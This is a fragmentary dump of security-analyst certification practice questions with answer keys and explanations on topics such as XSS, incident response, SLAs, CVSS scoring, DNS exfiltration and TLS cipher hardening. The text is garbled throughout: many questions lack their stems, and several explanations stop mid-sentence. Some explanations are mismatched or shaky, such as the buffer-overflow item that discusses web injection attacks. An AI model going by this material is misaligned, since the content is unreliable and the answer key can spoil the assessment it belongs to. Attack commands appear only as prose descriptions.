> consume memory and CPU resources, and prevent legitimate connections
> from being established.
>
> TCPDump can help the administrator to detect a SYN flood attack by

A.  Directory traversal

B.  XSS

C.  XXE

D.  SSRF

### Answer: B 

### Explanation:

> XSS (cross-site scripting) is the vulnerability type that the security
> analyst is validating, as the snippet shows an attempt to inject a
> script tag into the web application. XSS is a web security

A.  A well-defined timeline of the events

B.  A guideline for regulatory reporting

C.  Logs from the impacted system

D.  A well-developed executive summary

### Answer: A 

### Explanation:

> A well-defined timeline of the events is the most important factor to
> ensure accurate incident response reporting, as it provides a clear
> and chronological account of what happened, when it happened, who was
> involved, and what actions were taken. A timeline helps to identify

## QUESTION 200

> A security analyst is trying to detect connections to a suspicious IP
> address by collecting the packet captures from the gateway. Which of
> the following commands should the security analyst consider running?

A.  grep \[IP address\] packets.pcap

B.  cat packets.pcap \| grep \[IP Address\]

C.  tcpdump -n -r packets.pcap host \[IP address\]

D.  strings packets.pcap \| grep \[IP Address\]

### Answer: C 

### Explanation: 

> tcpdump is a command-line tool that can capture and analyze network
> packets from a given interface or file. The -n option prevents tcpdump
> from resolving hostnames, which can speed up the analysis. The -r
> option reads packets from a file, in this case packets.pcap. The host
> \[IP address\] filter specifies that tcpdump should only display
> packets that have the given IP address as either the source or the

C.  Accept the risk and decommission current assets as end of life

D.  Request an exception and manually patch each system

### Answer: A 

### Explanation:

### 

> Integrating an IT service delivery ticketing system to track

A.  Shut down the server.

B.  Reimage the server.

C.  Quarantine the server.

D.  Update the OS to latest version.

### Answer: C 

### Explanation:

> Quarantining the server is the best action to perform immediately, as
> it isolates the affected server from the rest of the network and

B.  Simulate an incident by shutting down power to the primary data
    center.

C.  Migrate active workloads from the primary data center to the
    secondary location.

D.  Compare the current plan to lessons learned from previous incidents.

### Answer: A 

### Explanation:

> Performing a tabletop drill based on previously identified incident
> scenarios is the best way to test the changes to the BC and DR plans
> without any impact to the business, as it is a low-cost and low-risk
> method of exercising the plans and identifying any gaps or issues. A

> does not involve any actual simulation or disruption of the systems or
> processes, but rather relies on verbal communication and documentation
> review. A tabletop drill can help to ensure that everyone is familiar
> with the BC/DR plans, that the plans reflect the current state of the
> organization, and that the plans are consistent and coordinated across
> different functions. The other options are not as suitable as
> performing a tabletop drill, as they involve more cost, risk, or
> impact to the business. Simulating an incident by shutting down power
> to the primary data center is a type of BC/DR exercise that involves
> creating an actual disruption or outage of a critical system or
> process, and observing how the organization responds and recovers.
> This type of exercise can provide a realistic assessment of the BC/DR
> capabilities, but it can also cause significant impact to the business
> operations, customers, and reputation. Migrating active workloads from
> the primary data center to the secondary location is a type of BC/DR

> another, and verifying that the backup system or site can support the
> normal operations. This type of exercise can help to validate the
> functionality and performance of the backup system or site, but it can
> also incur high costs, complexity, and potential errors or failures.
> Comparing the current plan to lessons learned from previous incidents
> is a type of BC/DR activity that involves reviewing past experiences

## QUESTION 217

## 

> After identifying a threat, a company has decided to implement a patch
> management program to remediate vulnerabilities. Which of the
> following risk management principles is the company exercising?

A.  Transfer

B.  Accept

C.  Mitigate

D.  Avoid

### Answer: C 

### Explanation:

> Mitigate is the best term to describe the risk management principle
> that the company is exercising, as it means to reduce the likelihood
> or impact of a risk. By implementing a patch management program to
> remediate vulnerabilities, the company is mitigating the threat of
> cyberattacks that could exploit those vulnerabilities and compromise
> the security or functionality of the systems. The other terms are not
> as accurate as mitigate, as they describe different risk management
> principles. Transfer means to shift the responsibility or burden of a
> risk to another party, such as an insurer or a contractor. Accept
> means to acknowledge the existence of a risk and decide not to take
> any action to reduce it, usually because the risk is low or the cost
> of mitigation is too high. Avoid means to eliminate the possibility of
> a risk by changing the plans or activities that could cause it, such
> as cancelling a project or discontinuing a service.

## QUESTION 218

> A security analyst discovers an ongoing ransomware attack while
> investigating a phishing email. The analyst downloads a copy of the
> file from the email and isolates the affected workstation from the
> network. Which of the following activities should the analyst perform
> next?

A.  Wipe the computer and reinstall software

B.  Shut down the email server and quarantine it from the network

C.  Acquire a bit-level image of the affected workstation

D.  Search for other mail users who have received the same file

### Answer: D 

### Explanation:

> Searching for other mail users who have received the same file is the
> best activity to perform next, as it helps to identify and contain the
> scope of the ransomware attack and prevent further damage. Ransomware
> is a type of malware that encrypts files on a system and demands
> payment for their decryption. Ransomware can spread through phishing
> emails that contain malicious attachments or links that download the
> ransomware. By searching for other mail users who have received the
> same file, the analyst can alert them not to open it, delete it from
> their inboxes, and scan their systems for any signs of infection. The
> other activities are not as urgent or effective as searching for other
> mail users who have received the same file, as they do not address the
> immediate threat of ransomware spreading or affecting more systems.
> Wiping the computer and reinstalling software may restore the
> functionality of the affected workstation, but it will also erase any
> evidence of the ransomware attack and make recovery of encrypted files
> impossible. Shutting down the email server and quarantining it from
> the network may stop the delivery of more phishing emails, but it will
> also disrupt normal communication and operations for the organization.
> Acquiring a bit-level image of the affected workstation may preserve
> the evidence of the ransomware attack, but it will not help to stop or
> remove the ransomware or decrypt the files.

## QUESTION 219

## 

> The security analyst received the monthly vulnerability report. The
> following findings were included in the report:

- Five of the systems only required a reboot to finalize the patch
  application

- Two of the servers are running outdated operating systems and cannot
  be patched

> The analyst determines that the only way to ensure these servers
> cannot be compromised is to isolate them. Which of the following
> approaches will best minimize the risk of the outdated servers being
> compromised?

A.  Compensating controls

B.  Due diligence

C.  Maintenance windows

D.  Passive discovery

### Answer: A 

### Explanation:

> Compensating controls are the best approach to minimize the risk of
> the outdated servers being compromised, as they can provide an
> alternative or additional layer of security when the primary control
> is not feasible or effective. Compensating controls are security
> measures that are implemented to mitigate the risk of a vulnerability
> or an attack when the primary control is not feasible or effective.
> For example, if the servers are running outdated operating systems and
> cannot be patched, a compensating control could be to isolate them
> from the rest of the network, or to implement a firewall or an
> intrusion prevention system to monitor and block any malicious traffic
> to or from the servers. Compensating controls can help reduce the
> likelihood or impact of an exploit, but they do not eliminate the risk
> completely. Therefore, the security analyst should also consider
> upgrading or replacing the outdated servers as soon as possible.

A.  Increasing training and awareness for all staff

B.  Ensuring that malicious websites cannot be visited

C.  Blocking all scripts downloaded from the internet

D.  Disabling all staff members\' ability to run downloaded applications

### Answer: A 

### Explanation:

### 

> Increasing training and awareness for all staff is the best way to
> address the issue of employees being enticed to assist attackers by
> visiting specific websites and running downloaded files when prompted
> by phone calls. This issue is an example of social engineering, which

## QUESTION 225

> A security administrator has been notified by the IT operations
> department that some vulnerability reports contain an incomplete list
> of findings. Which of the following methods should be used to resolve
> this issue?

A.  Credentialed scar

B.  External scan

C.  Differential scan

D.  Network scan

### Answer: A 

### Explanation:

### 

> A credentialed scan is a type of vulnerability scan that uses valid
> credentials to log in to the scanned systems and perform a more
> thorough and accurate assessment of their vulnerabilities. A
> credentialed scan can access more information than a non-credentialed
> scan, such as registry keys, patch levels, configuration settings, and
> installed applications. A credentialed scan can also reduce the number
> of false positives and false negatives, as it can verify the actual
> state of the system rather than relying on inference or assumptions.
> The other types of scans are not related to the issue of incomplete
> findings, as they refer to different aspects of vulnerability
> scanning, such as the scope, location, or frequency of the scan. An
> external scan is a scan that is performed from outside the network
> perimeter, usually from the internet. An external scan can reveal how
> an attacker would see the network and what vulnerabilities are exposed
> to the public. An external scan cannot access internal systems or
> resources that are behind firewalls or other security controls. A
> differential scan is a scan that compares the results of two scans and
> highlights the differences between them. A differential scan can help
> identify changes in the network environment, such as new
> vulnerabilities, patched vulnerabilities, or new devices. A
> differential scan does not provide a complete list of findings by
> itself, but rather a summary of changes. A network scan is a scan that
> focuses on the network layer of the OSI model and detects
> vulnerabilities related to network devices, protocols, services, and
> configurations. A network scan can discover open ports, misconfigured
> firewalls, unencrypted traffic, and other network-related issues. A
> network scan does not provide information about the application layer
> or the host layer of the OSI model, such as web applications or
> operating systems.

## QUESTION 226

> An organization enabled a SIEM rule to send an alert to a security
> analyst distribution list when ten failed logins occur within one
> minute. However, the control was unable to detect an attack with nine
> failed logins. Which of the following best represents what occurred?

A.  False positive

B.  True negative

C.  False negative

D.  True positive

### Answer: C

### Explanation:
>
> A false negative is a situation where an attack or a threat is not
> detected by a security control, even though it should have been. In
> this case, the SIEM rule was unable to detect an attack with nine
> failed logins, which is below the threshold of ten failed logins that
> triggers an alert. This means that the SIEM rule missed a potential

A.  Uncredentialed scan

B.  Discovery scan

C.  Vulnerability scan

D.  Credentialed scan

### Answer: B 

### Explanation:

### 

> A discovery scan is a type of web application scanning that involves

## QUESTION 228

> Which of the following best describes the process of requiring
> remediation of a known threat within a given time frame?

A.  SLA

B.  MOU

C.  Best-effort patching

D.  Organizational governance

### Answer: A 

### Explanation:

> An SLA (Service Level Agreement) is a contract or agreement between a
> service provider and a customer that defines the expected level of
> service, performance, quality, and availability of the service. An SLA
> also specifies the responsibilities, obligations, and penalties for
> both parties in case of non-compliance or breach of the agreement. An
> SLA can help organizations to ensure that their security services are
> delivered in a timely and effective manner, and that any security
> incidents or vulnerabilities are addressed and resolved within a
> specified time frame. An SLA can also help to establish clear
> communication, expectations, and accountability between the service
> provider and the customer.
>
> An MOU (Memorandum of Understanding) is a document that expresses a
> mutual agreement or understanding between two or more parties on a
> common goal or objective. An MOU is not legally binding, but it can
> serve as a basis for future cooperation or collaboration. An MOU may
> not be suitable for requiring remediation of a known threat within a
> given time frame, as it does not have the same level of
> enforceability, specificity, or measurability as an SLA. Best-effort
> patching is an informal and ad hoc approach to applying security
> patches or updates to systems or software. Best-effort patching does
> not follow any defined process, policy, or schedule, and relies on the
> availability and discretion of the system administrators or users.
> Best-effort patching may not be effective or efficient for requiring
> remediation of a known threat within a given time frame, as it does
> not guarantee that the patches are applied correctly, consistently, or
> promptly. Best-effort patching may also introduce new risks or
> vulnerabilities due to human error, compatibility issues, or lack of
> testing.
>
> Organizational governance is the framework of rules, policies,
> procedures, and processes that guide and direct the activities and
> decisions of an organization. Organizational governance can help to
> establish the roles, responsibilities, and accountabilities of
> different stakeholders within the organization, as well as the goals,
> values, and principles that shape the organizational culture and
> behavior. Organizational governance can also help to ensure compliance
> with internal and external standards, regulations, and laws.
> Organizational governance may not be sufficient for requiring
> remediation of a known threat within a given time frame, as it does
> not specify the details or metrics of the service delivery or
> performance. Organizational governance may also vary depending on the
> size, structure, and nature of the organization.

A.  Accept

B.  Avoid

C.  Mitigate

D.  Transfer

### Answer: D

### Explanation:
>
> Transfer is the risk management principle that is accomplished by

## QUESTION 232

> An analyst is conducting routine vulnerability assessments on the
> company infrastructure. When performing these scans, a
> business-critical server crashes, and the cause is traced back to the
> vulnerability scanner. Which of the following is the cause of this
> issue?

A.  The scanner is running without an agent installed.

B.  The scanner is running in active mode.

C.  The scanner is segmented improperly

D.  The scanner is configured with a scanning window

### Answer: B 

### Explanation:

> The scanner is running in active mode, which is the cause of this
> issue. Active mode is a type of vulnerability scanning that sends
> probes or requests to the target systems to test their responses and
> identify potential vulnerabilities. Active mode can provide more
> accurate and comprehensive results, but it can also cause more network
> traffic, performance degradation, or system instability. In some
> cases, active mode can trigger denial-of-service (DoS) conditions or
> crash the target systems, especially if they are not configured to
> handle the scanning requests or if they have underlying
> vulnerabilities that can be exploited by the scanner. Therefore, the
> analyst should use caution when performing active mode scanning, and
> avoid scanning business-critical or sensitive systems without proper
> authorization and preparation.

B.  Implement MFA requirements for all internal resources

C.  Harden systems by disabling or removing unnecessary services

D.  Implement controls to block execution of untrusted applications

### Answer: D 

### Explanation:

> Implementing controls to block execution of untrusted applications can
> prevent privilege escalation attacks that leverage native Windows
> tools, such as PowerShell, WMIC, or Rundll32. These tools can be used

## QUESTION 246

> A security analyst receives an alert for suspicious activity on a
> company laptop. An excerpt of the log is shown below:
>
![](/static/images/image63.jpeg)
>
> Which of the following has most likely occurred?

A.  An Office document with a malicious macro was opened.

B.  A credential-stealing website was visited.

C.  A phishing link in an email was clicked D. A web browser
    vulnerability was exploited.

### Answer: A 

### Explanation:

> An Office document with a malicious macro was opened is the most
> likely
>
> Explanation for the suspicious activity on the company laptop, as it
> reflects the common technique of using macros to execute PowerShell
> commands that download and run malware. A macro is a piece of code
> that can automate tasks or perform actions in an Office document, such
> as a Word file or an Excel spreadsheet. Macros can be useful and
> legitimate, but they can also be abused by threat actors to deliver
> malware or perform malicious actions on the system. A malicious macro
> can be embedded in an Office document that is sent as an attachment in
> a phishing email or hosted on a compromised website. When the user
> opens the document, they may be prompted to enable macros or content,
> which will trigger the execution of the malicious code. The malicious
> macro can then use PowerShell, which is a scripting language and
> command-line shell that is built into Windows, to perform various
> tasks, such as downloading and running malware from a remote URL,
> bypassing security controls, or establishing persistence on the
> system. The log excerpt shows that PowerShell was used to download a
> string from a URL using the WebClient.DownloadString method, which is
> a common way to fetch and execute malicious code from the internet.
> The log also shows that PowerShell was used to invoke an expression
> (iex) that contains obfuscated code, which is another common way to
> evade detection and analysis.

## QUESTION 247

> During an incident, a security analyst discovers a large amount of Pll
> has been emailed externally from an employee to a public email
> address. The analyst finds that the external email is the employee\'s
> personal email. Which of the following should the analyst recommend be
> done first?

A.  Place a legal hold on the employee\'s mailbox.

B.  Enable filtering on the web proxy.

C.  Disable the public email access with CASB.

D.  Configure a deny rule on the firewall.

### Answer: A 

### Explanation:

> Placing a legal hold on the employee\'s mailbox is the best action to
> perform first, as it preserves all mailbox content, including deleted
> items and original versions of modified items, for potential legal or
> forensic purposes. A legal hold is a feature that allows an
> administrator to retain mailbox data for a user indefinitely or for a
> specified period, regardless of the user\'s actions or retention
> policies. A legal hold can be applied to a mailbox using Litigation
> Hold or In-Place Hold in Exchange Server or Exchange Online. A legal
> hold can help to ensure that evidence of data exfiltration or other
> malicious activities is not lost or tampered with, and that the
> organization can comply with any legal or regulatory obligations.

## QUESTION 248

> An attacker has just gained access to the syslog server on a LAN.
> Reviewing the syslog entries has allowed the attacker to prioritize
> possible next targets. Which of the following is this an example of?

A.  Passive network foot printing

B.  OS fingerprinting

C.  Service port identification

D.  Application versioning

### Answer: A 

### Explanation:

> Passive network foot printing is the best description of the example,
> as it reflects the technique of collecting information about a network
> or system by monitoring or sniffing network traffic without sending
> any packets or interacting with the target. Foot printing is a term
> that refers to the process of gathering information about a target
> network or system, such as its IP addresses, open ports, operating
> systems, services, or vulnerabilities. Foot printing can be done for
> legitimate purposes, such as penetration testing or auditing, or for
> malicious purposes, such as reconnaissance or intelligence gathering.
> Foot printing can be classified into two types: active and passive.
> Active foot printing involves sending packets or requests to the
> target and analyzing the responses, such as using tools like ping,
> traceroute, or Nmap. Active foot printing can provide more accurate
> and detailed information, but it can also be detected by firewalls or
> intrusion detection systems (IDS). Passive foot printing involves
> observing or capturing network traffic without sending any packets or
> requests to the target, such as using tools like tcpdump, Wireshark,
> or Shodan. Passive foot printing can provide less information, but it
> can also avoid detection by firewalls or IDS. The example in the
> question shows that the attacker has gained access to the syslog
> server on a LAN and reviewed the syslog entries to prioritize possible
> next targets. A syslog server is a server that collects and stores log
> messages from various devices or applications on a network. A syslog
> entry is a record of an event or activity that occurred on a device or
> application, such as an error, a warning, or an alert. By reviewing
> the syslog entries, the attacker can obtain information about the
> network or system, such as its configuration, status, performance, or
> security issues. This is an example of passive network foot printing,
> as the attacker is not sending any packets or requests to the target,
> but rather observing or capturing network traffic from the syslog
> server.

## QUESTION 249

> Several users received a phishing email containing a malicious file
> that bypassed the organization's email security tool. Based on the
> SIEM logs, users did not open the file within the environment. In
> which of the following phases of the MITRE ATT&CK framework was the
> attack stopped?

A.  Lateral movement

B.  Execution

C.  Initial access

D.  Discovery

### Answer: B 

### Explanation:

> Because the malicious file was delivered but never opened or run by
> any user, the attack halted at the point where the adversary would
> need to execute code on a host, so it was stopped in the Execution
> phase.

## QUESTION 250

> A security analyst has found the following suspicious DNS traffic
> while analyzing a packet capture:

- DNS traffic while a tunneling session is active.

- The mean time between queries is less than one second.

- The average query length exceeds 100 characters. Which of the
  following attacks most likely occurred?

A.  DNS exfiltration

B.  DNS spoofing

C.  DNS zone transfer

D.  DNS poisoning

### Answer: A 

### Explanation:

> DNS exfiltration is a technique that uses the DNS protocol to transfer
> data from a compromised network or device to an attacker-controlled
> server. DNS exfiltration can bypass firewall rules and security
> products that do not inspect DNS traffic. The characteristics of the
> suspicious DNS traffic in the question match the indicators of DNS
> exfiltration, such as:
>
> DNS traffic while a tunneling session is active: This implies that the
> DNS protocol is being used to create a covert channel for data
> transfer.
>
> The mean time between queries is less than one second: This implies
> that the DNS queries are being sent at a high frequency to maximize
> the amount of data transferred. The average query length exceeds 100
> characters: This implies that the DNS queries are encoding large
> amounts of data in the subdomains or other fields of the DNS packets.

A.  MOU

B.  NDA

C.  BIA

D.  SLA

### Answer: D 

### Explanation:

> SLA stands for Service Level Agreement, which is a contract that
> defines the various levels of maintenance to be provided by an
> external business vendor in a secure environment. An SLA specifies the
> expectations, responsibilities, and obligations of both parties, such
> as the scope,

## QUESTION 252

> During the log analysis phase, the following suspicious command is
> detected:

![](/static/images/image64.jpeg)

> Which of the following is being attempted?

A.  Buffer overflow

B.  RCE

C.  ICMP tunneling

D.  Smurf attack

### Answer: B 

### Explanation:

> RCE stands for remote code execution, which is a type of attack that
> allows an attacker to execute arbitrary commands on a target system.
> The suspicious command in the question is an example of RCE, as it
> tries to download and execute a malicious file from a remote server
> using the wget and chmod commands. A buffer overflow is a type of
> vulnerability that occurs when a program writes more data to a memory
> buffer than it can hold, potentially overwriting other memory
> locations and corrupting the program\'s execution. ICMP tunneling is a
> technique that uses ICMP packets to encapsulate and transmit data that
> would normally be blocked by firewalls or filters. A smurf attack is a
> type of DDoS attack that floods a network with ICMP echo requests,
> causing all devices on the network to reply and generate a large

> of the following steps should the administrator take next?

A.  Inform the internal incident response team.

B.  Follow the company\'s incident response plan.

C.  Review the lessons learned for the best approach.

D.  Determine when the access started.

### Answer: B 

### Explanation:

> An incident response plan is a set of predefined procedures and
> guidelines that an organization follows when faced with a security
> breach or attack. An incident response plan helps to ensure that the
> organization can quickly and effectively contain, analyze, eradicate,
> and recover from the incident, as well as prevent or minimize the
> damage and impact to the business operations, reputation, and
> customers. An incident response plan also defines the roles and
> responsibilities of the incident response team, the communication
> channels and protocols, the escalation and reporting procedures, and
> the tools and resources available for the incident response. By
> following the company\'s incident response plan, the administrator can
> ensure that they are following the best practices and standards for
> handling a security incident, and that they are coordinating and
> collaborating with the relevant stakeholders and authorities.
> Following the company\'s incident response plan can also help to avoid
> or reduce any legal, regulatory, or contractual liabilities or
> penalties that may arise from the incident. The other options are not
> as effective or appropriate as following the company\'s incident
> response plan. Informing the internal incident response team (A) is a
> good step, but it should be done according to the company\'s incident
> response plan, which may specify who, when, how, and what to report.
> Reviewing the lessons learned for the best approach ?is a good step,
> but it should be done after the incident has been resolved and closed,

> transmitted over the network, including usernames and passwords, which
> makes it vulnerable to eavesdropping, interception, and modification
> by attackers. Telnet also has many known vulnerabilities that can
> allow attackers to gain unauthorized access, execute arbitrary
> commands, or cause denial-of-service attacks on the target host Port
> 636 is used by LDAP over SSL/TLS (LDAPS), which is a protocol for
> accessing and modifying directory services over a secure connection.
> LDAPS encrypts the data exchanged between the client and the server
> using SSL/TLS certificates, which provide authentication,
> confidentiality, and integrity. However, LDAPS can also be vulnerable
> to attacks if the certificates are not properly configured, verified,
> or updated. For example, attackers can use self-signed or expired
> certificates to perform man-in-the-middle attacks, spoofing attacks,
> or certificate revocation attacks on LDAPS connections. Therefore, the
> security team should investigate further why port 23 and port 636 are

A.  Log retention

B.  Log rotation

C.  Maximum log size

D.  Threshold value

### Answer: D 

### Explanation:

> A threshold value is a parameter that defines the minimum or maximum

>
> Which of the following should be remediated first?

A.  SQL injection

B.  RFI

C.  XSS

D.  Code injection

### Answer: A 

### Explanation:

> SQL injection should be remediated first, as it is a high-severity
> vulnerability that can allow an attacker to execute arbitrary SQL
> commands on the database server and access, modify, or delete
> sensitive data, including PII. According to the Arachni scan results,
> there are two instances of SQL injection and three instances of blind
> SQL injection (two timing attacks and one differential analysis) in
> the web application. These vulnerabilities indicate that the web
> application does not properly validate or sanitize the user input
> before passing it to the database server, and thus exposes the
> database to malicious queries. SQL injection can have serious
> consequences for the confidentiality, integrity, and availability of
> the data and the system, and can also lead to further attacks, such as
> privilege escalation, data exfiltration, or remote code execution.
> Therefore, SQL injection should be the highest priority for
> remediation, and the web application should implement input
> validation, parameterized queries, and least privilege principle to

> Which of the following systems should be prioritized for patching?

A.  brown

B.  grey

C.  blane

D.  sullivan

### Answer: C 

### Explanation:

> The system \"blane\" with the vulnerability name \"snakedoctor\"
> should be prioritized for patching as it has a network attack vector
> (AV:N), low attack complexity (AC:L), and high availability (A:H).
> These metrics indicate that it would be relatively easy to exploit
> this vulnerability over the internet, and the system is highly
> available. Reference: According to the CVSS v3.1 Specification
> Document, the exploitability metrics for CVSS are Attack Vector,
> Attack Complexity, Privileges Required, User Interaction, and Scope.
> These metrics measure how the vulnerability is accessed, the
> complexity of the attack, and the level of interaction and privileges
> required to exploit the vulnerability. The image shows a table with
> the values of these metrics for each system and vulnerability. Based
> on these values, the system \"blane\" has the highest exploitability
> score, as it has the most favorable conditions for an attacker. The
> other systems have either a lower attack vector, higher attack
> complexity, or lower availability, which make them less exploitable.
> Therefore, the system \"blane\" should be patched first.

> were found in a group of servers in a segment of the network. Which of
> the following steps should be taken next?

A.  Isolation

B.  Remediation C. Reimaging

> D. Preservation

### Answer: A 

### Explanation:

> Isolation is the first step to take after detecting some indicators of
> compromise (IoCs) of possible ransomware contamination. Isolation
> prevents the ransomware from spreading to other servers or segments of
> the network, and allows the security team to investigate and contain
> the incident.
>
> Isolation can be done by disconnecting the infected servers from the
> network, blocking the malicious traffic, or applying firewall rules.

## QUESTION 347

> An MSSP received several alerts from customer 1, which caused a missed
> incident response deadline for customer 2. Which of the following best
> describes the document that was violated?

A.  KPI

B.  SLO

C.  SLA

D.  MOU

### Answer: C 

### Explanation:

> An SLA, or Service Level Agreement, is a contract between a service
> provider and its customers that documents what services the provider
> will furnish and defines the service standards the provider is
> obligated to meet. In the scenario described, the missed incident
> response deadline is a clear indicator of an SLA violation. An SLA
> usually outlines the metrics by which service is measured as well as
> remedies or penalties should agreed-upon service levels not be
> achieved. Unlike a KPI (Key Performance Indicator) which is a
> quantifiable measure used to evaluate the success of an organization,
> employee, etc., in meeting objectives for performance, or an MOU
> (Memorandum of Understanding) which is a formal agreement between two
> or more parties, an SLA is focused on the performance and quality
> metrics applicable to the service provided. SLO (Service Level
> Objective) is related and often part of an SLA, representing the
> specific measurable characteristics of the SLA such as availability,
> throughput, frequency, response time, or quality.

## QUESTION 348

> Which of the following is a reason proper handling and reporting of
> existing evidence are important for the investigation and reporting
> phases of an incident response?

A.  To ensure the report is legally acceptable in case it needs to be
    presented in court

B.  To present a lessons-learned analysis for the incident response team

C.  To ensure the evidence can be used in a postmortem analysis

D.  To prevent the possible loss of a data source for further root cause
    analysis

### Answer: A 

### Explanation:

> Proper handling and reporting of existing evidence are important for
> the investigation and reporting phases of an incident response because
> they ensure the integrity, authenticity, and admissibility of the
> evidence in case it needs to be presented in court. Evidence that is
> mishandled, tampered with, or poorly documented may not be accepted by
> the court or may be challenged by the opposing party. Therefore,
> incident responders should follow the best practices and standards for
> evidence collection, preservation, analysis, and reporting.

## QUESTION 351

> After reviewing the final report for a penetration test, a
> cybersecurity analyst prioritizes the remediation for input validation
> vulnerabilities. Which of the following attacks is the analyst seeking
> to prevent?

A.  DNS poisoning

B.  Pharming

C.  Phishing

D.  Cross-site scripting

### Answer: D 

### Explanation:

> Cross-site scripting (XSS) attacks occur when an application includes
> untrusted data in a web page without proper validation or escaping.
> This allows attackers to execute malicious scripts in users\'
> browsers, leading to data theft, session hijacking, or defacement.
> Remediating input validation vulnerabilities is essential to prevent
> XSS attacks.

<hr>
## QUESTION 352

> During a security test, a security analyst found a critical
> application with a buffer overflow vulnerability. Which of the
> following would be best to mitigate the vulnerability at the
> application level?

A.  Perform OS hardening.

B.  Implement input validation.

C.  Update third-party dependencies.

D.  Configure address space layout randomization.

### Answer: B 

### Explanation:

### 

> Implementing input validation is the best way to mitigate the buffer
> overflow vulnerability at the application level. Input validation is a
> technique that checks the data entered by users or attackers against a
> set of rules or constraints, such as data type, length, format, or
> range. Input validation can prevent common web application attacks
> such as SQL injection, cross-site scripting (XSS), or command
> injection, which exploit the lack of input validation to execute
> malicious code or commands on the server or the client side. By
> validating the input before allowing submission, the web application
> can reject or sanitize any malicious or unexpected input, and protect
> the application from being compromised.

## QUESTION 353

> The SOC received a threat intelligence notification indicating that an
> employee\'s credentials were found on the dark web. The user\'s web
> and log-in activities were reviewed for malicious or anomalous
> connections, data uploads/downloads, and exploits. A review of the
> controls confirmed multifactor authentication was enabled. Which of
> the following should be done first to mitigate impact to the business
> networks and assets?

A.  Perform a forced password reset.

B.  Communicate the compromised credentials to the user.

C.  Perform an ad hoc AV scan on the user\'s laptop.

D.  Review and ensure privileges assigned to the user\'s account reflect
    least privilege. E. Lower the thresholds for SOC alerting of
    suspected malicious activity

### Answer: A 

### Explanation:

> The first and most urgent step to mitigate the impact of compromised
> credentials on the dark web is to perform a forced password reset for
> the affected user. This will prevent the cybercriminals from using the
> stolen credentials to access the company\'s network and systems.
> Multifactor authentication is a good security measure, but it is not
> foolproof and can be bypassed by sophisticated attackers. Therefore,
> changing the password as soon as possible is the best practice to
> reduce the risk of a data breach or other cyber attack.

## QUESTION 356

> A company has a primary control in place to restrict access to a
> sensitive database. However, the company discovered an authentication
> vulnerability that could bypass this control. Which of the following
> is the best compensating control?

A.  Running regular penetration tests to identify and address new
    vulnerabilities.

B.  Conducting regular security awareness training of employees to
    prevent social engineering attacks.

C.  Deploying an additional layer of access controls to verify
    authorized individuals.

D.  Implementing intrusion detection software to alert security teams of
    unauthorized access attempts

### Answer: C 

### Explanation:

> Deploying an additional layer of access controls to verify authorized
> individuals is the best compensating control for the authentication
> vulnerability that could bypass the primary control. A compensating
> control is a security measure that is implemented to mitigate the risk
> of a vulnerability or a threat when the primary control is not
> sufficient or feasible. A compensating control should provide a
> similar or greater level of protection as the primary control, and
> should be closely related to the vulnerability or the threat it is
> addressing. In this case, the primary control is to restrict access to
> a sensitive database, and the vulnerability is an authentication
> bypass. Therefore, the best compensating control is to deploy an
> additional layer of access controls, such as multifactor
> authentication, role-based access control, or encryption, to verify
> the identity and the authorization of the individuals who are
> accessing the database. This way, the compensating control can prevent
> unauthorized access to the database, even if the primary control is
> bypassed. Running regular penetration tests, conducting regular
> security awareness training, and implementing intrusion detection
> software are all good security practices, but they are not
> compensating controls for the authentication vulnerability, as they do
> not provide a similar or greater level of protection as the primary
> control, and they are not closely related to the vulnerability or the
> threat they are addressing.

> Vulnerability Scoring System and it is a standardized system for
> measuring and rating the severity of vulnerabilities. The CVSS base
> score is a numerical value between 0 and 10 that reflects the
> intrinsic characteristics of a vulnerability, such as its
> exploitability, impact, and scope. The CVSS base score is composed of
> three metric groups: Base, Temporal, and Environmental. The Base
> metric group captures the characteristics of a vulnerability that are
> constant over time and across user environments. The Base metric group
> consists of six metrics: Attack Vector, Attack Complexity, Privileges
> Required, User Interaction, Scope, and Impact. The Impact metric
> measures the effect of a vulnerability on the confidentiality,
> integrity, and availability of the affected resources. In this case,
> the CVSS base score of the vulnerability is 9.8, which indicates a
> critical severity level. The Impact metric of the CVSS base score is
> 6.0, which indicates a high impact on confidentiality, integrity, and
> availability. Therefore, the Metrics section provides information

## QUESTION 374

## 

> During a recent site survey. an analyst discovered a rogue wireless
> access point on the network. Which of the following actions should be
> taken first to protect the network while preserving evidence?

A.  Run a packet sniffer to monitor traffic to and from the access
    point.

B.  Connect to the access point and examine its log files.

C.  Identify who is connected to the access point and attempt to find
    the attacker. D. Disconnect the access point from the network

### Answer: D 

### Explanation:

> A rogue access point is a wireless access point that has been
> installed on a network without the authorization or knowledge of the
> network administrator. A rogue access point can pose a serious
> security risk, as it can allow unauthorized users to access the
> network, intercept network traffic, or launch attacks against the
> network or its devices. The first action that should be taken to
> protect the network while preserving evidence is to disconnect the
> rogue access point from the network. This will prevent any further
> damage or compromise of the network by blocking the access point from
> communicating with other devices or users. Disconnecting the rogue
> access point will also preserve its state and configuration, which can
> be useful for forensic analysis and investigation. Disconnecting the
> rogue access point can be done physically by unplugging it from the
> network port or wirelessly by disabling its radio frequency.

## QUESTION 375

> While a security analyst for an organization was reviewing logs from
> web servers. the analyst found several successful attempts to
> downgrade HTTPS sessions to use cipher modes of operation susceptible
> to padding oracle attacks. Which of the following combinations of
> configuration changes should the organization make to remediate this
> issue? (Choose two.)

A.  Configure the server to prefer TLS 1.3.

B.  Remove cipher suites that use CBC.

C.  Configure the server to prefer ephemeral modes for key exchange.

D.  Require client browsers to present a user certificate for mutual
    authentication.

E.  Configure the server to require HSTS.

F.  Remove cipher suites that use GCM.

### Answer: AB

### Explanation:
>
> A padding oracle attack is a type of attack that exploits the padding
> validation of a cryptographic message to decrypt the ciphertext
> without knowing the key. A padding oracle is a system that responds to
> queries about whether a message has a valid padding or not, such as a
> web server that returns different error messages for invalid padding
> or invalid MAC. A padding oracle attack can be applied to the CBC mode
> of operation, where the attacker can manipulate the ciphertext blocks
> and use the oracle\'s responses to recover the plaintext. To remediate
> this issue, the organization should make the following configuration
> changes:
>
> Configure the server to prefer TLS 1.3. TLS 1.3 is the latest version
> of the Transport Layer Security protocol, which provides secure
> communication between clients and servers. TLS 1.3 has several
> security improvements over previous versions, such as:
>
> It deprecates weak and obsolete cryptographic algorithms, such as RC4,
> MD5, SHA-1, DES, 3DES, and CBC mode.
>
> It supports only strong and modern cryptographic algorithms, such as
> AES-GCM, ChaCha20-Poly1305, and SHA-256/384.
>
> It reduces the number of round trips required for the handshake
> protocol, which improves performance and latency.
>
> It encrypts more parts of the handshake protocol, which enhances
> privacy and confidentiality. It introduces a zero round-trip time
